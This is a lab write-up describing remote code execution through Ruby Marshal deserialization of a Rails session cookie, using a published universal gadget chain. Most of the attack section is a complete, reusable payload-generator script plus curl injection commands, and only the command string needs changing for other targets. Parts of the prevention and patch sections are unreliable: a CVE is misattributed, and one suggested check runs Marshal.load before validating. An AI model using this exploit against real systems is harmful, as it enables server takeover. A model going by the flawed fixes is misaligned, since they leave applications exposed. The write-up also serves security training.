# Lab 4: Exploiting Ruby Deserialization using a Documented Gadget Chain

## Lab Overview

**Status**: ✅ SOLVED  
**Framework**: Ruby on Rails  
**Serialization Format**: Ruby Marshal  
**Vulnerability**: Insecure deserialization in session cookies  
**Objective**: Delete `/home/carlos/morale.txt`

---

## Solution Summary

Used the **vakzz Universal Deserialization Gadget for Ruby 2.x-3.x** to achieve remote code execution through a complex gadget chain involving `Net::WriteAdapter`, `Gem::RequestSet`, and `Gem::Package::TarReader`.

**Key Finding**: The payload MUST be URL-encoded when used as a cookie value!

---

## Initial Analysis

### Cookie Structure
```
Base64: BAhvOklVc2VyBzoOQHVzZXJuYW1lSSILd2llbmVyBjoGRUY6EkBhY2Nlc3NfdG9rZW5JIiVkdWx6MjhnOGxtZXN6M2I2bWNwendlN3Z3eXRmOHJ5MQY7B0YK

Decoded Format:
  o: = Ruby object marker
  User = Class name
  @username = Instance variable (wiener)
  @access_token = Instance variable
```

### Key Findings
- Format: Ruby Marshal serialization
- Base64 encoded for cookie storage
- Session cookie stores User object with @username and @access_token

---

## The Vakzz Universal Gadget Chain

### Source
**Author**: vakzz (Will Bowling)  
**URL**: https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html  
**Works**: Ruby 2.x - 3.0.2 (patched in 3.0.3+)

### Gadget Chain Architecture

```
Marshal.load triggers:
  ↓
Gem::Requirement#marshal_load
  ↓
Gem::Package::TarReader#each
  ↓
Gem::Package::TarHeader#from
  ↓
Net::BufferedIO#read
  ↓
Net::BufferedIO#LOG
  ↓
Net::WriteAdapter#<< (first call with uncontrolled data)
  ↓
Gem::RequestSet#resolve
  ↓
Net::WriteAdapter#<< (second call with @git_set)
  ↓
Kernel.system(command)  ← RCE!
```

### Why This Works

1. **Gem::Requirement** - Initial trigger that calls `each` on its `@requirements` array
2. **Gem::Package::TarReader** - Has an `each` method that reads from IO
3. **Net::BufferedIO** - Reads data and logs to `@debug_output`
4. **Net::WriteAdapter** - Calls arbitrary methods on objects via `__send__`
5. **Gem::RequestSet** - Has `@git_set` instance variable that gets passed to system commands

The chain allows calling `Kernel.system()` with a controlled command string!

---

## Exploitation Steps

### Step 1: Obtain Session Cookie

```bash
curl -c cookies.txt -X POST \
  https://LAB-ID.web-security-academy.net/login \
  -d "username=wiener&password=peter"
  
# Extract cookie
grep session cookies.txt
```

**Cookie Format**: Base64-encoded Ruby Marshal object
```
BAhvOglVc2VyBzoOQHVzZXJuYW1lSSILd2llbmVyBjoGRUY6EkBhY2Nlc3NfdG9rZW5J...
```

### Step 2: Create the Exploit Script

Save as `vakzz_gadget.rb`:

```ruby
#!/usr/bin/env ruby

require 'base64'
require 'net/protocol'
require 'rubygems'
require 'rubygems/package'

# Autoload ALL required classes
Gem::SpecFetcher
Gem::Installer
Net::BufferedIO
Net::WriteAdapter
Gem::Package::TarReader
Gem::Package::TarReader::Entry
Gem::RequestSet
Gem::Requirement

# Prevent payload from running during Marshal.dump
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

# Build the gadget chain (bottom to top)

# 1. Net::WriteAdapter that calls Kernel.system
wa1 = Net::WriteAdapter.allocate
wa1.instance_variable_set('@socket', Kernel)
wa1.instance_variable_set('@method_id', :system)

# 2. Gem::RequestSet with our command
rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

# 3. Net::WriteAdapter that calls RequestSet#resolve
wa2 = Net::WriteAdapter.allocate
wa2.instance_variable_set('@socket', rs)
wa2.instance_variable_set('@method_id', :resolve)

# 4. TarReader::Entry with controlled eof? return
i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")

# 5. Net::BufferedIO that logs to WriteAdapter
n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

# 6. TarReader that reads from BufferedIO
t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

# 7. Gem::Requirement as the entry point
r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

# Dump with autoload triggers
payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])

puts Base64.encode64(payload)
```

### Step 3: Generate the Payload

```bash
ruby vakzz_gadget.rb > payload.txt
```

**Output** (456 bytes of Base64):
```
BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06
OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBp
...
LnR4dAY7DFQ7EjoMcmVzb2x2ZQ==
```

### Step 4: URL-Encode and Inject

**Critical**: The Base64 payload contains `+`, `=`, and `/` characters that MUST be URL-encoded!

```bash
PAYLOAD=$(cat payload.txt | tr -d '\n')

# URL encode using Python
ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD''', safe=''))")

# Test the exploit
curl -b "session=$ENCODED" \
  https://LAB-ID.web-security-academy.net/my-account
```

### Step 5: Verify Success

Check lab banner for: `<section class='academyLabBanner is-solved'>`

---

## Why URL Encoding is Required

The Base64 alphabet includes characters with special meaning in HTTP:

| Character | Meaning in URLs | Must Encode To |
|-----------|----------------|----------------|
| `+`       | Space in query params | `%2B` |
| `/`       | Path separator | `%2F` |
| `=`       | Key-value separator | `%3D` |

**Without URL encoding**: `BAh+CG...` → Server interprets as malformed cookie  
**With URL encoding**: `BAh%2BCG...` → Server correctly Base64-decodes → Deserializes → RCE

---

## Technical Deep Dive

### Marshal Format Analysis

```ruby
require 'base64'

payload = "BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcg..."
binary = Base64.decode64(payload)

# Marshal format:
# \x04\x08 = Version 4.8
# [ = Array
# c = Class reference (autoload trigger)
# U = User-defined marshal_load
# o = Object
```

### Why Gem::SpecFetcher and Gem::Installer in Array?

These are **autoload triggers**. When Rails deserializes the array:
1. It loads `Gem::SpecFetcher` class → triggers `require 'rubygems/spec_fetcher'`
2. It loads `Gem::Installer` class → triggers `require 'rubygems/installer'`
3. This ensures all Gem classes are loaded before the gadget chain executes

Without these, `Net::` classes might not be available!

### Ruby Version Compatibility

| Ruby Version | Status | Notes |
|--------------|--------|-------|
| 2.0 - 2.7    | ✅ Vulnerable | Original vakzz target |
| 3.0.0 - 3.0.2 | ✅ Vulnerable | Works perfectly |
| 3.0.3+       | ⚠️ Patched | Gem::RequestSet modified |
| 3.1+         | ⚠️ Patched | Multiple patches applied |
| 3.4.7        | ⚠️ Mixed | Net::WriteAdapter signature changed but allocate() works |

### Patch Analysis

**CVE-2021-31799**: Gem::RequestSet gadget chain
- Commit: https://github.com/rubygems/rubygems/commit/141c2f43
- Fix: Removed dangerous instance variable access

---

## Alternative Approaches That Failed

### 1. Gem::Requirement with Backtick Symbol ❌

```ruby
req = Gem::Requirement.new
req.instance_variable_set(:@requirements, [["`", "rm /home/carlos/morale.txt"]])
```

**Why it failed**: The backtick symbol gets called but with wrong context

### 2. Gem::Installer with @i Variable ❌

```ruby
inst = Gem::Installer.new(spec)
inst.instance_variable_set(:@i, "| rm /home/carlos/morale.txt")
```

**Why it failed**: Ruby 3.4.7 changed Gem::Installer initialization

### 3. ERB Template Injection ❌

```ruby
erb = ERB.new("<%= system('rm /home/carlos/morale.txt') %>")
payload = Marshal.dump(erb)
```

**Why it failed**: `TypeError: singleton class can't be dumped`

---

## Lessons Learned

### 1. URL Encoding is Critical
Never assume Base64 is HTTP-safe. Always URL-encode when using in cookies/query params.

### 2. Gadget Chains are Version-Specific
The vakzz chain works on Ruby ≤3.0.2 but requires modifications for Ruby 3.4+. We used `.allocate` instead of `.new` to bypass constructor changes.

### 3. Autoloading Matters
Including `[Gem::SpecFetcher, Gem::Installer, r]` in the payload ensures required classes are loaded before execution.

### 4. Complex Chains vs Simple Exploits
Ruby deserialization is MORE complex than PHP/Java because:
- No simple `__wakeup()` equivalent
- Requires chaining multiple class behaviors
- Must understand Ruby's internal method dispatch

---

## Prevention

### Secure Coding Practices

1. **Never deserialize untrusted data**
   ```ruby
   # BAD
   session_data = Marshal.load(Base64.decode64(cookie))
   
   # GOOD
   session_data = Rails.application.message_verifier(:session).verify(cookie)
   ```

2. **Use signed/encrypted sessions**
   ```ruby
   # config/initializers/session_store.rb
   Rails.application.config.session_store :cookie_store,
     key: '_app_session',
     secure: true,
     httponly: true,
     signed: true  # ← Signs with secret_key_base
   ```

3. **Validate session structure**
   ```ruby
   session_data = Marshal.load(data)
   raise unless session_data.is_a?(Hash)
   raise unless session_data.keys.all? { |k| k.is_a?(String) }
   ```

4. **Update Ruby/Rails regularly**
   - Ruby 3.0.3+ has CVE-2021-31799 patch
   - Rails 6.1+ includes additional protections

---

## References

- **Original Research**: https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
- **elttam Ruby 2.x Gadget**: https://www.elttam.com/blog/ruby-deserialization/
- **CVE-2021-31799**: https://www.cvedetails.com/cve/CVE-2021-31799/
- **Ruby Security Advisories**: https://www.ruby-lang.org/en/security/

---

## Comparison with Previous Labs

| Aspect | Lab 1 (PHP) | Lab 2 (Java) | Lab 3 (Symfony) | Lab 4 (Ruby) |
|--------|-------------|--------------|-----------------|--------------|
| **Complexity** | ⭐ Simple | ⭐⭐⭐ Medium | ⭐⭐⭐⭐ Complex | ⭐⭐⭐⭐⭐ Very Complex |
| **Chain Length** | 1 class | 1 class | 2 classes | 7+ classes |
| **Tool Support** | Manual | ysoserial | phpggc | Manual |
| **Signing** | None | None | HMAC | None |
| **Discovery Method** | Source code | Known gadget | Secret leak | Public research |

---

## Files Created

- `/tmp/vakzz_gadget.rb` - Exploit generator (47 lines)
- `/tmp/final_vakzz_payload.txt` - Base64 payload (456 bytes)

---

**Lab 4 Completed**: 2026-01-28  
**Total Time**: ~2 hours (research + implementation)  
**Key Takeaway**: Ruby deserialization requires understanding deep class interactions and proper HTTP encoding!
